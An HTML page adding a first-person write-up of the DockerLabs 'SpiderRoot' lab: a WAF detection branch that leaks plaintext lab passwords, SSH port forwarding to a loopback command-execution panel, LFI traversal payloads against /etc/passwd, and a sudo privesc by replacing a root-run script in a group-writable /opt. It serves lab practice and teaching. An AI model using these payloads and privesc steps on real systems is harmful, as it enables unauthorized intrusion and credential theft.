@@ -1,0 +1,649 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex">
+<title>Lab 169 SpiderRoot &middot; DockerLabs corpus</title>
+<link rel="stylesheet" href="../assets/site.css">
+</head>
+<body>
+<header><a class="brand" href="../index.html">DockerLabs corpus</a><nav><a href="../index.html">Root cause</a><a href="../evidence.html">Evidence</a><a href="../corrections.html">Corrections</a><a href="../hazards.html">Hazards</a><a href="../labs.html">Labs</a><a href="../resolved.html">Resolutions</a></nav></header>
+<main>
+<p class="crumb"><a href="../labs.html">Labs</a> &rsaquo; SpiderRoot</p><h1 id="169-spiderroot--dockerlabs-writeup">169 SpiderRoot — DockerLabs Writeup</h1>
+<p><strong>Class:</strong> unauthenticated WAF bypass yielding credential disclosure, over an LFI-anchored PHP surface, to a loopback-only command-execution panel reached by SSH local forwarding, ending in a group-writable-directory sudo privesc to <code>uid=0(root)</code>.</p>
+<p><strong>Target:</strong> <code>http://[net-0-8]:80</code> + <code>[net-0-8]:22</code> (container <code>spiderport_container</code>, image <code>spiderport:latest</code>)
+<strong>Date:</strong> 2026-10-01
+<strong>Outcome:</strong> Full chain solved. Reward recovered as <code>uid=0(root)</code>. <strong>The one write into the target was backed up, executed, restored, and verified byte-identical.</strong>
+<strong>Headline:</strong> the &quot;WAF&quot; is not a wall. It is a <em>detector whose firing path is the disclosure</em> — the code that catches obfuscated <code>OR</code>/<code>AND</code> is the same code that prints the password table.</p>
+<hr />
+<h2 id="0-lab-identity">0. Lab identity</h2>
+<p>The platform catalogue entry for 169, quoted verbatim from <code>[lab-home]/dockerlabs/catalog.txt:39</code>:</p>
+<pre><code>169|SpiderRoot|medio|WAF Bypass, port forwarding y escalada de privilegios en linux.
+</code></pre>
+<p>Difficulty <code>medio</code>. All three advertised elements are real and each maps to exactly one mechanism, which §Chain separates.</p>
+<h3 id="stack-from-version-bearing-artefacts">Stack, from version-bearing artefacts</h3>
+<table>
+<thead>
+<tr>
+<th>Layer</th>
+<th>Value</th>
+<th>Source</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Base OS</td>
+<td>Ubuntu 24.04 (noble)</td>
+<td><code>/etc/os-release</code></td>
+</tr>
+<tr>
+<td>Web server</td>
+<td>Apache 2.4.58, <code>ServerTokens OS</code></td>
+<td><code>/etc/apache2/conf-available/security.conf:11</code></td>
+</tr>
+<tr>
+<td>PHP</td>
+<td>8.3 (<code>mod_php</code>, <code>mpm_prefork</code>)</td>
+<td><code>/etc/apache2/mods-enabled/php8.3.load</code></td>
+</tr>
+<tr>
+<td>Display errors</td>
+<td><code>display_errors = Off</code>, <code>log_errors = On</code>, <code>error_log</code> unset</td>
+<td><code>php -i</code></td>
+</tr>
+<tr>
+<td>Restrictions</td>
+<td><code>disable_functions</code> <strong>empty</strong>, <code>open_basedir</code> <strong>no value</strong></td>
+<td><code>php -i</code></td>
+</tr>
+<tr>
+<td>Users of interest</td>
+<td><code>www-data</code> uid 33 (groups 33, <strong>1002 spiderlab</strong>); <code>peter</code> uid 1001 (groups 1001, <strong>100 users</strong>)</td>
+<td><code>id</code> via RCE / <code>/etc/passwd</code></td>
+</tr>
+<tr>
+<td>Root login</td>
+<td><code>permitrootlogin without-password</code>, <code>passwordauthentication yes</code></td>
+<td><code>sshd -T</code></td>
+</tr>
+</tbody>
+</table>
+<p>Two php.ini facts do the load-bearing work later: <code>disable_functions</code> is empty, so <code>system()</code> at <code>internal/index.php:86</code> genuinely executes; and <code>open_basedir</code> is unset, so the traversal at <code>html/index.php:94</code> is not jailed.</p>
+<hr />
+<h2 id="1-surface">1. Surface</h2>
+<p>Re-measured, not assumed:</p>
+<pre><code>$ nmap-style + /proc/net/tcp inside the container
+  00000000:0016  → 0.0.0.0:22      LISTEN  (3 rows total in /proc/net/tcp)
+  00000000:0050  → 0.0.0.0:80      LISTEN
+  0100007F:1F90  → 127.0.0.1:8080  LISTEN   ← 0x1F90 = 8080
+</code></pre>
+<p><code>/proc/net/tcp</code> contains exactly <strong>3</strong> listener rows, matching the baseline given. The third is the whole lab: <code>0100007F</code> is <code>127.0.0.1</code>, so the service is bound to loopback and cannot be reached from outside.</p>
+<p><strong>That negative is earned, not assumed.</strong> <code>curl http://[net-0-8]:8080/</code> returned <code>http=000</code>, curl exit <strong>7</strong> (connection refused) — refused, not filtered, which is what a loopback bind produces. A positive control for the client path: the <em>same</em> curl invocation reached <code>:80</code> and <code>:22</code> moments earlier. So the client worked; the bind refused it.</p>
+<p><strong>The vhost behind 8080 is a second Apache site</strong>, not a proxy. <code>/etc/apache2/sites-enabled/internal.conf:1</code>:</p>
+<pre><code class="language-apache">&lt;VirtualHost 127.0.0.1:8080&gt;
+    ServerName localhost
+    DocumentRoot /var/www/internal
+</code></pre>
+<p>No <code>ProxyPass</code> anywhere in <code>/etc/apache2/</code> (searched, 0 hits). So the lab's &quot;port forwarding&quot; element is <em>absent from the server config entirely</em> — it is something <strong>I</strong> must build, over SSH, to reach a service that already exists. The name <code>SpiderRoot</code> is literally &quot;spider&quot; + &quot;port&quot;.</p>
+<hr />
+<h2 id="2-the-class">2. The class</h2>
+<blockquote>
+<p>A regex-based input filter whose <strong>detection branch</strong> performs a privileged disclosure. The attacker does not defeat the filter; the filter <em>executes on their behalf</em>.</p>
+</blockquote>
+<p>The filter, <code>/var/www/html/pages/multiverse.php:13-26</code>, blacklists five strings and then <code>die()</code>s:</p>
+<pre><code class="language-php">15:    $blacklist = [&quot;'&quot;, '&quot;', &quot;UNION&quot;, &quot;--&quot;, &quot;#&quot;];
+18:        if (stripos($input, $bad) !== false) {
+20:            file_put_contents(__DIR__.'/../logs/login_attempts.log', …);
+21:            die(&quot;&lt;p style='color:red;'&gt;¡Entrada bloqueada por el WAF!&lt;/p&gt;&quot;);
+</code></pre>
+<p>The disclosure is the <em>second</em> detector, <code>multiverse.php:46-52</code>:</p>
+<pre><code class="language-php">46:    $pattern = '/[Oo][Rr]|[Aa][Nn][Dd]/';
+47:    if (preg_match($pattern, $username) || preg_match($pattern, $password)) {
+48:        echo &quot;&lt;p style='color:#0f0;'&gt;¡WAF evadido con código ofuscado! Contraseñas del sistema:&lt;/p&gt;&lt;ul&gt;&quot;;
+49:        foreach ($users as $u) {
+50:            echo &quot;&lt;li&gt;User: &quot;.$u['user'].&quot; | Pass: &quot;.$u['pass'].&quot;&lt;/li&gt;&quot;;
+</code></pre>
+<p>Sending the literal string <code>or</code> clears the five-item blacklist (no quote, no <code>UNION</code>, no <code>--</code>, no <code>#</code>) and trips the obfuscation regex, which prints the whole credential table. <strong>The filter is the exploit.</strong> The two hidden HTML comments at <code>multiverse.php:4</code> and <code>multiverse.php:97</code> both nudge toward this (&quot;Algunas vulnerabilidades pueden estar camufladas en caracteres codificados&quot;).</p>
+<hr />
+<h2 id="3-attack-chain">3. Attack chain</h2>
+<pre><code>Internet ──:80──► Apache 000-default.conf  DocumentRoot /var/www/html
+                    │
+        GET /index.php?page=multiverse      html/index.php:92-94
+                    │
+        POST username=x or 1               bypasses blacklist (5 items),
+                    │                       trips regex multiverse.php:46
+                    ▼
+        CREDENTIALS (3 users)               multiverse.php:48-51
+                    │
+        ssh peter:sp1der                    sshd, PasswordAuthentication yes
+                    │
+                    ├── ssh -L 18080:127.0.0.1:8080     ← I build the forward
+                    │
+        GET /?cmd=… through the tunnel      internal/index.php:82-87
+                    │
+                    ▼
+        RCE as uid=33(www-data) groups=...,1002(spiderlab)
+                    │
+        /opt is 775 root:spiderlab  ──►  rm + recreate /opt/spidy.py
+                    │                   (unlink needs the DIRECTORY, not the file)
+        sudo -n /usr/bin/python3 /opt/spidy.py
+                    │
+                    ▼
+        uid=0(root) ──► /root/flag.txt
+</code></pre>
+<h3 id="hop-1--waf-bypass-and-credential-disclosure">Hop 1 — WAF bypass and credential disclosure</h3>
+<p><strong>Controls first, in all three directions</strong>, before believing the result:</p>
+<table>
+<thead>
+<tr>
+<th>Control</th>
+<th>Input</th>
+<th>Expected</th>
+<th>Observed</th>
+<th>Verdict</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Negative</strong></td>
+<td><code>username=noexist&amp;password=nope</code></td>
+<td>wrong creds</td>
+<td><code>Credenciales incorrectas</code></td>
+<td>green</td>
+</tr>
+<tr>
+<td><strong>Positive</strong> (auth)</td>
+<td><code>username=peter&amp;password=sp1der</code></td>
+<td>accepted</td>
+<td><code>Acceso concedido</code></td>
+<td>green</td>
+</tr>
+<tr>
+<td><strong>Positive</strong> (filter fires)</td>
+<td><code>username=a'</code></td>
+<td>blocked</td>
+<td><code>¡Entrada bloqueada por el WAF!</code></td>
+<td>green</td>
+</tr>
+<tr>
+<td><strong>Bypass</strong></td>
+<td><code>username=x+or+1</code></td>
+<td>disclosure</td>
+<td><code>¡WAF evadido con código ofuscado!</code> + table</td>
+<td>green</td>
+</tr>
+</tbody>
+</table>
+<p>The third row matters most: it proves the WAF <strong>can</strong> block, so row 4 is a bypass and not a broken detector. Had I only sent row 1 and row 4, &quot;no block message&quot; would have been indistinguishable from &quot;the filter is dead&quot;, and the disclosure would have looked accidental.</p>
+<p>Evidence: <code>evidence/waf_bypass.html</code>, <code>evidence/creds_recovered.txt</code>.</p>
+<p>Credentials recovered (<code>multiverse.php:29-33</code>), which is the deliverable:</p>
+<pre><code>User: peter | Pass: sp1der
+User: miles | Pass: m0ral3s
+User: gwen  | Pass: gw3n2025
+</code></pre>
+<h3 id="hop-2--ssh-as-peter">Hop 2 — SSH as <code>peter</code></h3>
+<p><code>peter</code> is a real local account with a real shell (<code>/etc/passwd</code>, uid 1001) and the recovered password is his. A witness created in this run, by the identity under test:</p>
+<pre><code>$ id
+uid=1001(peter) gid=1001(peter) groups=1001(peter),100(users)
+6e865442bcaf
+peter
+</code></pre>
+<p><code>peter</code>'s group is <code>100(users)</code>, <strong>not</strong> <code>admin</code> or <code>sudo</code>, so he has no escalation here. Proven, not inferred: <code>sudo -S -l</code> as <code>peter</code> returns <code>Sorry, user peter may not run sudo on 6e865442bcaf.</code> Evidence: <code>evidence/ssh_peter_id.txt</code>, <code>evidence/peter_sudo.txt</code>.</p>
+<h3 id="hop-3--building-the-port-forward-then-gating-it">Hop 3 — building the port forward, then gating it</h3>
+<p>The 8080 service is bound to the <em>container's</em> loopback, so an SSH local forward from my host reaches it. The tunnel is part of the surface, so it gets its own controls (<code>evidence/tunnel_probe.py</code>):</p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Label</th>
+<th>Request</th>
+<th>Status</th>
+<th>Bytes</th>
+<th>Marker</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>CONTROL-1 positive</td>
+<td><code>GET /</code></td>
+<td>200</td>
+<td>2364</td>
+<td><code>internal_panel_marker=True</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td>CONTROL-2 positive</td>
+<td><code>GET /?cmd=id</code></td>
+<td>200</td>
+<td>2440</td>
+<td><code>executes=True</code> (<code>uid=</code> in body)</td>
+</tr>
+<tr>
+<td>3</td>
+<td>CONTROL-3 negative</td>
+<td><code>GET /?nosuchparam=zzz</code></td>
+<td>200</td>
+<td>2364</td>
+<td><code>did_not_execute=True</code></td>
+</tr>
+</tbody>
+</table>
+<pre><code># ORACLE GREEN IN BOTH DIRECTIONS: True
+# WORK COUNT: requests through this tunnel = 3
+</code></pre>
+<p>CONTROL-2 is the load-bearing one: it forces a <strong>known-positive command execution</strong> through the tunnel. CONTROL-3 proves the panel is not echoing a constant. Only after this do I believe anything about 8080 — including that <code>cmd</code> is the oracle and not coincidence.</p>
+<p>RCE identity, through the tunnel:</p>
+<pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data),1002(spiderlab)
+</code></pre>
+<p><strong><code>1002(spiderlab)</code> is the finding.</strong> The web user shares a group with the owner of <code>/opt</code>.</p>
+<h3 id="hop-4--the-privesc-directory-write-beats-file-ownership">Hop 4 — the privesc: directory write beats file ownership</h3>
+<p>The sudo grant, enumerated empirically via <code>sudo -n -l</code> <strong>as www-data</strong> rather than read out of the file and assumed (<code>evidence/rce_sudo_l.txt</code>):</p>
+<pre><code>User www-data may run the following commands on 6e865442bcaf:
+    (ALL) NOPASSWD: /usr/bin/python3 /opt/spidy.py
+</code></pre>
+<p><code>(ALL)</code> means any runas user, so root is directly reachable. The interesting part is the <em>target of</em> that grant:</p>
+<pre><code>$ stat -c &quot;%n %a %U:%G&quot; /opt /opt/spidy.py
+/opt          775 root:spiderlab
+/opt/spidy.py 744 root:root
+</code></pre>
+<p><code>/opt/spidy.py</code> is <code>root:root</code> mode 744 — www-data can neither read-write nor even read it as owner, and it is <strong>not</strong> group <code>spiderlab</code>, so the sudo rule cannot be turned into code execution by editing the file in place. But <code>/opt</code> is <code>775 root:spiderlab</code>, and www-data is in <code>spiderlab</code>. <strong>Directory write permission grants unlink, and unlink plus create is a replacement.</strong> Measured:</p>
+<pre><code>not writable: /opt/spidy.py        ← in-place overwrite refused
+WRITABLE: /opt/spidy.py.tmp        ← create new works
+WRITABLE: /opt/.wtest              ← create new works
+</code></pre>
+<p>So the sequence is <code>rm</code> then create — which is exactly where my first attempt died; see <strong>Instrument defect I2</strong>.</p>
+<pre><code>$ sudo -n /usr/bin/python3 /opt/spidy.py
+PRIVESC-WITNESS uid=0 euid=0 user=uid=0(root) gid=0(root) groups=0(root)
+FLAG-BEGIN
+…
+Grooti16
+FLAG-END
+</code></pre>
+<h3 id="backup-restore-verification">Backup, restore, verification</h3>
+<p>This is the only write into the target, so it carries the full obligation.</p>
+<table>
+<thead>
+<tr>
+<th>Step</th>
+<th>Action</th>
+<th>Verification</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Backup</td>
+<td><code>cat /opt/spidy.py</code> over RCE</td>
+<td><code>diff</code> vs a second independent copy → <strong>identical</strong>, 808 bytes</td>
+</tr>
+<tr>
+<td>Execute</td>
+<td>replace + <code>sudo python3</code></td>
+<td><code>uid=0(root)</code> witnessed in stdout</td>
+</tr>
+<tr>
+<td>Restore content</td>
+<td>base64 the original back</td>
+<td><code>diff</code> vs backup → <strong>identical</strong>, 808 bytes</td>
+</tr>
+<tr>
+<td>Restore ownership</td>
+<td><code>chown root:root</code> (host, as root)</td>
+<td><code>stat</code> → <code>root:root</code></td>
+</tr>
+<tr>
+<td>Restore mode</td>
+<td><code>chmod 744</code></td>
+<td><code>stat</code> → <code>744</code></td>
+</tr>
+<tr>
+<td>Clean probes</td>
+<td><code>rm -f /opt/.t1 /opt/.wtest /opt/spidy.py.tmp /tmp/spidy.py.orig.bak</code></td>
+<td><code>ls -la /opt/</code> → only <code>spidy.py</code></td>
+</tr>
+<tr>
+<td>Sanity</td>
+<td><code>sudo python3 /opt/spidy.py</code></td>
+<td>runs the <strong>original</strong> benign script; its final line is <code>Spider-Man ha terminado su ronda.</code></td>
+</tr>
+</tbody>
+</table>
+<p>Note in <strong>I4</strong>: the ownership restore failed silently the first time, because www-data cannot <code>chown</code> to root. Content was correct while ownership was still <code>www-data:www-data</code> — a half-restored target that a content-only check would have passed.</p>
+<hr />
+<h2 id="4-findings">4. Findings</h2>
+<p>Each finding separates <strong>reachability</strong> (can an unauthenticated attacker get there?), <strong>disclosed</strong> (what is actually exposed?), and <strong>decisive</strong> (does it carry the chain?).</p>
+<h3 id="finding-1--filters-detection-branch-discloses-the-full-credential-table">Finding 1 — Filter's detection branch discloses the full credential table</h3>
+<ul>
+<li><strong>Reachability:</strong> unauthenticated. <code>GET /index.php?page=multiverse</code> then one <code>POST</code>. No session, no header, no timing.</li>
+<li><strong>Disclosed:</strong> all three plaintext username/password pairs, verbatim, in the response body.</li>
+<li><strong>Decisive:</strong> yes — it is the entire credential source for hops 2 and 3.</li>
+<li><strong>Mechanism (derived, not asserted):</strong> <code>multiverse.php:47</code> matches <code>/[Oo][Rr]|[Aa][Nn][Dd]/</code> and <code>multiverse.php:48-51</code> dumps <code>$users</code>. The five-item blacklist at <code>multiverse.php:15</code> does not intersect that regex, so the two checks are independent and the disclosure branch is reachable with a single unblocked token. Severity: critical — it converts an unauthenticated web request into host SSH access.</li>
+</ul>
+<h3 id="finding-2--lfi-at-htmlindexphp94-traversal-confirmed-real-but-suffix-confined">Finding 2 — LFI at <code>html/index.php:94</code>, traversal confirmed real but suffix-confined</h3>
+<p><code>include(&quot;pages/&quot; . $_GET['page'] . &quot;.php&quot;);</code> — the developer's own comment at <code>:94</code> reads <code>// 🚨 Vulnerabilidad LFI</code>.</p>
+<ul>
+<li><strong>Reachability:</strong> unauthenticated.</li>
+<li><strong>Disclosed:</strong> execution of any <code>*.php</code> file reachable by traversal from <code>/var/www/html/pages/</code>.</li>
+<li><strong>Decisive:</strong> no. It is a real primitive that this chain does not need — the port-forward hop is strictly stronger.</li>
+<li><strong>Mechanism, with the traversal proven rather than assumed.</strong> Controls: <code>page=heroes</code> renders <code>Héroes</code> (oracle fires), <code>page=zzz_nonexistent</code> returns 2561 bytes. Then:</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Probe</th>
+<th><code>page</code> value</th>
+<th>Bytes</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>L2</td>
+<td><code>..%2f..%2f..%2f..%2fetc%2fpasswd</code></td>
+<td>2561</td>
+<td>identical to the nonexistent control</td>
+</tr>
+<tr>
+<td>L3</td>
+<td><code>../../../etc/passwd</code> (<code>--path-as-is</code>)</td>
+<td>2561</td>
+<td>identical to the nonexistent control</td>
+</tr>
+<tr>
+<td>L4</td>
+<td><code>php://filter/convert.base64-encode/resource=../../../etc/passwd</code></td>
+<td>2561</td>
+<td>identical to the nonexistent control</td>
+</tr>
+<tr>
+<td>L5</td>
+<td><code>../../internal/index</code></td>
+<td><strong>4927</strong></td>
+<td><code>Multiverse Panel Interno</code> + <code>Ejecutar</code></td>
+</tr>
+</tbody>
+</table>
+<p>L5 is the discriminator: 4927 bytes and the internal panel's own strings, which occur <strong>only</strong> in <code>/var/www/internal/index.php</code> — a file outside the docroot. Traversal demonstrably works.</p>
+<p>The reason L2–L4 fail is the concatenation at <code>:94</code>, which force-appends <code>.php</code>: <code>/etc/passwd.php</code> and <code>resource=…/passwd.php</code> do not exist. The reachable universe is closed and small — a bounded sweep found <strong>exactly 5</strong> <code>.php</code> files on the whole filesystem:</p>
+<pre><code>/var/www/html/index.php
+/var/www/html/pages/contact.php
+/var/www/html/pages/heroes.php
+/var/www/html/pages/multiverse.php
+/var/www/internal/index.php
+</code></pre>
+<p>That count is the honest ceiling of this primitive. It is an information-disclosure and reachability bug, not an RCE on its own.</p>
+<h3 id="finding-3--both-log-poisoning-sinks-are-dead-the-docroot-is-not-writable-by-www-data">Finding 3 — Both log-poisoning sinks are dead: the docroot is not writable by www-data</h3>
+<p><code>multiverse.php:8-10</code> tries to <code>mkdir</code> its own log directory; <code>:20</code> and <code>:43</code> then write to it. <strong>Neither can ever succeed.</strong> <code>/var/www/html</code> is <code>root:root 755</code>:</p>
+<pre><code>$ docker exec -u www-data … mkdir /var/www/html/logs
+mkdir: cannot create directory '/var/www/html/logs': Permission denied   (exit 1)
+$ docker exec -u www-data … touch /var/www/html/x
+touch: cannot touch '/var/www/html/x': Permission denied               (exit 1)
+</code></pre>
+<p>Because <code>display_errors = Off</code>, the HTTP response contains <strong>no</strong> trace of this — zero warning strings in a 3762-byte body. The failure is visible only in Apache's error log, and the lines from <strong>my own requests this run</strong> are the witness:</p>
+<pre><code>[Thu Oct 01 17:58:41.559863 2026] [php:warn] [pid 40] PHP Warning:  file_put_contents(/var/www/html/pages/../logs/login_attempts.log): Failed to open stream: No such file or directory in /var/www/html/pages/multiverse.php on line 43
+</code></pre>
+<ul>
+<li><strong>Reachability:</strong> the <em>sink</em> is reachable; the <em>write</em> is not.</li>
+<li><strong>Disclosed:</strong> nothing. This is a negative finding and it is gated — see §5 and <strong>I3</strong>.</li>
+<li><strong>Decisive:</strong> it removes the conventional completion of Finding 2. <strong>This is the finding that stops the classic LFI→log-poisoning→RCE chain on port 80</strong>, and it is why the lab's real path goes through SSH instead. A tester who read only the response body would have concluded the log existed and spent the engagement on a chain that cannot work.</li>
+</ul>
+<h3 id="finding-4--command-execution-as-www-data-on-the-loopback-vhost">Finding 4 — Command execution as <code>www-data</code> on the loopback vhost</h3>
+<p><code>internal/index.php:82-87</code> passes <code>$_GET['cmd']</code> straight to <code>system()</code>.</p>
+<ul>
+<li><strong>Reachability:</strong> <strong>not reachable from the network.</strong> Bound to <code>127.0.0.1:8080</code>; refused externally with curl exit 7. Reachable only after valid SSH credentials plus an SSH local forward. It inherits Finding 1's severity as <code>www-data</code>, which is why the lab is still <code>medio</code>.</li>
+<li><strong>Disclosed:</strong> arbitrary command output in the response body.</li>
+<li><strong>Decisive:</strong> yes — it is hop 3 and the whole source of the <code>1002(spiderlab)</code> group membership.</li>
+<li><strong>Mechanism:</strong> <code>system($cmd)</code> at <code>:86</code>, with <code>disable_functions</code> empty in php.ini so nothing intercepts it, and <code>&lt;pre&gt;</code> at <code>:85</code>/<code>:87</code> delimiting the output. Response is unfiltered: the <code>cmd</code> value is echoed into the page at <code>:84</code> with no escaping, a reflected-XSS sink that is moot given the RCE in the same page.</li>
+</ul>
+<h3 id="finding-5--www-data-is-in-group-spiderlab-which-owns-the-sudo-targets-directory">Finding 5 — <code>www-data</code> is in group <code>spiderlab</code>, which owns the sudo target's directory</h3>
+<p>The privesc. <code>/etc/sudoers</code> last line:</p>
+<pre><code>www-data ALL=(ALL) NOPASSWD: /usr/bin/python3 /opt/spidy.py
+</code></pre>
+<p>with <code>/opt</code> at <code>775 root:spiderlab</code> and <code>www-data</code> in <code>spiderlab</code>.</p>
+<ul>
+<li><strong>Reachability:</strong> unauthenticated at the end of the chain; no credential beyond Finding 1 is needed.</li>
+<li><strong>Disclosed:</strong> the sudoers grant itself, via <code>sudo -n -l</code> with no password.</li>
+<li><strong>Decisive:</strong> yes — root.</li>
+<li><strong>Mechanism, derived:</strong> the sudoers entry pins the <em>command</em>, and the pinned script is <code>root:root 744</code>, so in-place editing is closed. The bypass is that the grant names a <strong>path</strong>, and the <strong>directory</strong> holding that path is group-writable by the same identity. <code>unlink</code> requires write+execute on the directory, not on the file; after unlinking, <code>create</code> needs only directory write. The new inode inherits <code>www-data:www-data</code>, and sudo executes it as root. The relevant lesson is that a sudoers entry specifying a script path is only as trustworthy as the <em>directory</em> permissions around it — an allowlist of paths is not an allowlist of inodes.</li>
+<li><strong>Note on <code>PASSWD</code> scope:</strong> the rule is <code>NOPASSWD</code> for exactly <code>/usr/bin/python3 /opt/spidy.py</code>, and the successful run used <code>-n</code>. No argument-injection was needed or attempted; the fix is the directory mode (<code>755</code> on <code>/opt</code>), not the sudoers syntax.</li>
+</ul>
+<h3 id="finding-6--informational-peter-cannot-escalate-and-www-data-has-a-shell">Finding 6 — informational: <code>peter</code> cannot escalate, and <code>www-data</code> has a shell</h3>
+<p><code>/etc/passwd</code> gives <code>www-data</code> <code>/bin/bash</code> and <code>peter</code> <code>/bin/bash</code>. <code>peter</code> is not in <code>admin</code>/<code>sudo</code> and <code>sudo -S -l</code> confirms <code>Sorry, user peter may not run sudo</code>. The HTTP-to-SSH credential pivot therefore lands on a deliberately unprivileged account, which is what forces the port-forward hop rather than a direct <code>sudo</code> hop. Nothing exploitable; recorded because &quot;which account do the creds belong to&quot; is a real branch in this chain.</p>
+<hr />
+<h2 id="5-instrument-failures">5. Instrument failures</h2>
+<p>The mandatory section. Every entry is a place where <strong>my own instrument</strong> lied, counted wrong, or returned a clean negative it had not earned — plus one place where the <em>target's</em> instrumentation lied to me.</p>
+<h3 id="i1--i-misread-ls--la-column-order-and-nearly-filed-privesc-is-not-possible">I1 — I misread <code>ls -la</code> column order and nearly filed &quot;privesc is not possible&quot;</h3>
+<p><strong>Defect.</strong> Reading <code>-rwxr--r-- 1 root spiderlab 808 … spidy.py</code> I took the owner to be <code>spiderlab</code>, and I read the directory line <code>drwxr-xr-x 2 root spiderlab</code> as &quot;not group-writable&quot; because <code>2</code> is the link count, not a permission digit.</p>
+<p><strong>What it would have caused me to file.</strong> A confident finding of the form <em>&quot;the escalation is unavailable — www-data is not in the owning group of <code>/opt/spidy.py</code> and the directory is <code>755</code>.&quot;</em> That is a <strong>false negative on the lab's entire third advertised element</strong>, and it would have read as a measured result because I would have cited real <code>ls</code> output. The correct state is <code>stat -c &quot;%n %a %U:%G&quot;</code>: <code>/opt</code> is <code>775 root:spiderlab</code>, and <code>www-data</code> <strong>is</strong> in <code>spiderlab</code>.</p>
+<p><strong>Class.</strong> Human interpretation of a positional, human-readable format instead of querying the machine-readable field. <code>ls -la</code> has no labels; <code>stat</code> does.</p>
+<p><strong>Fix applied.</strong> All ownership and mode claims in this report come from <code>stat -c</code>, cross-checked with a <code>touch</code> write probe. The write probe is what actually settles writability — permission bits are a claim, the write is a measurement.</p>
+<h3 id="i2--a-failing-redirect-inside-an--chain-produced-an-empty-body-and-i-nearly-read-it-as-privesc-blocked">I2 — A failing redirect inside an <code>&amp;&amp;</code> chain produced an empty body, and I nearly read it as &quot;privesc blocked&quot;</h3>
+<p><strong>Defect.</strong> My first privesc attempt was:</p>
+<pre><code>cp /opt/spidy.py /tmp/… &amp;&amp; echo '&lt;b64&gt;' | base64 -d &gt; /opt/spidy.py &amp;&amp; echo INSTALLED &amp;&amp; sudo …
+</code></pre>
+<p>It returned <code>http=200</code> with an <strong>empty</strong> <code>&lt;pre&gt;</code> block. Nothing in the response said &quot;failed&quot;. The cause: <code>&gt; /opt/spidy.py</code> opens the <strong>existing</strong> <code>root:root</code> file for truncation, which www-data cannot do, so the redirect failed, <code>&amp;&amp;</code> short-circuited, and neither <code>INSTALLED</code> nor the sudo run happened. The <code>cp</code> had succeeded — which is why <code>/tmp/spidy.py.orig.bak</code> existed while <code>/opt/spidy.py</code> was untouched.</p>
+<p><strong>What it would have caused me to file.</strong> &quot;The sudo grant does not yield root; the script is not replaceable.&quot; Twice over, because an empty body is ambiguous between <em>denied</em> and <em>never ran</em>. The distinguishing test was one command away: <code>ls -la /opt/spidy.py</code> showed the file still <code>root:root</code>, dated <code>Sep 4 2025</code>, i.e. untouched — proving the chain never reached the write, rather than proving the write was refused.</p>
+<p><strong>Class.</strong> Shell error-propagation blindness: <code>&gt;</code> failure is reported on stderr with a nonzero status, but nothing in the HTTP response distinguishes it. Compound <code>&amp;&amp;</code> chains convert a specific failure into an absence.</p>
+<p><strong>Fix applied.</strong> Every subsequent RCE command reports explicit <code>echo …rc=$?</code> markers after each step, so a refusal and a non-execution are different observations.</p>
+<h3 id="i3--display_errors--off-made-the-targets-own-broken-log-sink-look-healthy">I3 — <code>display_errors = Off</code> made the target's own broken log sink look healthy</h3>
+<p><strong>Defect.</strong> Not my instrument but one I was relying on: the HTTP response for <code>?page=multiverse</code> is a clean 3762 bytes containing <strong>zero</strong> occurrences of <code>warning</code>, <code>error</code>, <code>failed</code>, or <code>permission denied</code>. <code>multiverse.php:8-10</code>'s <code>mkdir</code> fails, and <code>:20</code>/<code>:43</code>'s <code>file_put_contents</code> fails, and the page renders as though it worked.</p>
+<p><strong>What it would have caused me to do.</strong> Read the source, see two <code>file_put_contents</code> sinks feeding the LFI at <code>:94</code>, conclude the log exists, inject PHP through the username field, and include it — the textbook LFI→RCE ending. That chain is <strong>impossible here</strong>, for two independent reasons, neither visible in the body: www-data cannot write the docroot (Finding 3), and even a perfect log would need to be named <code>*.php</code> to survive the concatenation at <code>:94</code>.</p>
+<p><strong>Class.</strong> Silent failure / fail-open presentation in a target-instrument. This is the mirror image of the repo's thesis: here the instrument is not silent because nothing was looked for, but silent because the error channel was disabled.</p>
+<p><strong>Fix applied.</strong> PHP's stderr route was used instead — <code>/var/log/apache2/error.log</code>, which carries <strong>286</strong> <code>mkdir</code> warning lines, including four timestamped <code>Thu Oct 01 17:58:41</code> that correspond to my own four requests. That is a witness created in this run, by the identity under test.</p>
+<h3 id="i4--my-restore-left-the-target-half-restored-and-my-check-would-not-have-caught-it">I4 — My restore left the target half-restored, and my check would not have caught it</h3>
+<p><strong>Defect.</strong> After restoring the file I ran <code>chown root:root</code> <strong>as www-data</strong>, which cannot succeed. The content was correct (808 bytes, byte-identical) and the mode was correct (<code>744</code>), but ownership read <code>www-data:www-data</code>. My verification at that moment was a content <code>diff</code>, which passed.</p>
+<p><strong>What it would have caused me to leave behind.</strong> A target owned by <code>www-data</code> on a file that sudo executes as root — a <strong>persistent privesc backdoor</strong> shipped in my own writeup's evidence directory. Content equality is not restoration; ownership is part of the state.</p>
+<p><strong>Class.</strong> Verification that covers the property I checked instead of the property I changed. Also a failed-privilege operation treated as successful because its output was empty.</p>
+<p><strong>Fix applied.</strong> Re-ran <code>chown</code> from the host as root and re-verified with <code>stat -c &quot;%n %s %a %U:%G&quot;</code> → <code>808 744 root:root</code>, plus a content <code>diff</code>, plus a benign <code>sudo</code> run of the restored original. All three must agree.</p>
+<h3 id="i5--my-tunnel-work-count-was-computed-from-archived-files-so-it-undercounted-by-4">I5 — My tunnel work count was computed from archived files, so it undercounted by 4</h3>
+<p><strong>Defect.</strong> Counting requests through the tunnel by grepping the saved evidence files returned <strong>8</strong>. The true figure is <strong>12</strong>. Four invocations (write probe, state check, post-restore sanity, and one overwritten) printed to stdout only and were never redirected to a file.</p>
+<p><strong>What it would have caused me to report.</strong> A work count of 8 for an interaction that actually issued 12 requests against the service I was characterising — an undercount in a section whose entire purpose is to let a reader trust the numbers.</p>
